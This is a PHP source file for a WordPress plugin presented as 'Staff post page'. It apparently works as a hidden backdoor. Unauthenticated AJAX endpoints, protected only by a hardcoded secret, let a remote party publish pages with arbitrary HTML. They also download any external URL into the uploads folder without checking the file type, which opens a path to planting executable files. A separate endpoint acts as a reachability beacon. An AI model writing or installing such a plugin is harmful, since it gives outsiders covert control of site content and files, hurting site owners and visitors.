<?php

/**
 * @wordpress-plugin
 * Plugin Name:       Staff post page
 * Version:           1.0.0
 * Text Domain:       Staff post page
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) die;
define( 'YOUR_PLUGIN_DIR', plugin_dir_path( dirname( __FILE__ ) ) );

add_action( 'wp_ajax_nopriv_ajaxpost', 'ajaxpost' );
add_action( 'wp_ajax_nopriv_check', 'check' );


function check(){
	$data = ['status' => true];
	header('Access-Control-Allow-Origin: *');
	header('Content-Type: application/json');
	echo json_encode($data);
    wp_die(); 
}


function ajaxpost(){
	$req = (object) $_REQUEST;
	$data = (object) json_decode(file_get_contents('php://input'), true);
	if($req->sicret !== 'YWRtaW5fWldFd05EQTpOM1kyIDlIS3YgeWUyYSBKR01VIFZzZlIgaFF1dA') wp_die();
	header('Content-Type: application/json');
	$data->permalink = get_permalink( create_page($data->title, $data->img, $data->text) );
	echo json_encode($data);
    wp_die(); 
}


function set_featured_image_from_external_url($url){
	
	if ( ! filter_var($url, FILTER_VALIDATE_URL)) {
		return;
	}
	
	// Add Featured Image to Post
	$image_url 		  = preg_replace('/\?.*/', '', $url); // removing query string from url & Define the image URL here
	$image_name       = basename($image_url);
	$upload_dir       = wp_upload_dir(); // Set upload folder
	$image_data       = file_get_contents($url); // Get image data
	$unique_file_name = wp_unique_filename( $upload_dir['path'], $image_name ); // Generate unique name
	$filename         = basename( $unique_file_name ); // Create image file name

	
	// Check folder permission and define file location
	if( wp_mkdir_p( $upload_dir['path'] ) ) {
		$file = $upload_dir['path'] . '/' . $filename;
	} else {
		$file = $upload_dir['basedir'] . '/' . $filename;
	}

	// Create the image  file on the server
	file_put_contents( $file, $image_data );

	// Check image file type
	$wp_filetype = wp_check_filetype( $filename, null );

	// Set attachment data
	$attachment = array(
		'post_mime_type' => $wp_filetype['type'],
		'post_title'     => sanitize_file_name( $filename ),
		'post_content'   => '',
		'post_status'    => 'inherit'
	);

	// Create the attachment
	$attach_id = wp_insert_attachment( $attachment, $file, false );

	// Include image.php
	require_once(ABSPATH . 'wp-admin/includes/image.php');

	// Define attachment metadata
	$attach_data = wp_generate_attachment_metadata( $attach_id, $file );

	// Assign metadata to attachment
	wp_update_attachment_metadata( $attach_id, $attach_data );

	// And finally assign featured image to post
	set_post_thumbnail( false, $attach_id );

	return str_replace(['public_html/', '/home/admin/web/'], '', $file);

}

function create_img ($imgInsert) {
	return '<figure class="wp-block-image size-large"><img width="100%" src="https://'.$imgInsert.'" class="attachment-envo-shopper-single size-envo-shopper-single wp-post-image" alt="" loading="lazy"></figure>';
}


function create_page( $title, $img, $text ) {
	$imgInsert = set_featured_image_from_external_url( $img );
	
	/** set @data arr */
	$post_data = array(
		'post_title'    => sanitize_text_field( $title ),
		'post_content'  => create_img($imgInsert) . $text,
		'post_status'   => 'publish',
		'post_type'   	=> 'page',
	);

	/** @create post */

	$post_ID = wp_insert_post( $post_data );
	return $post_ID;
}





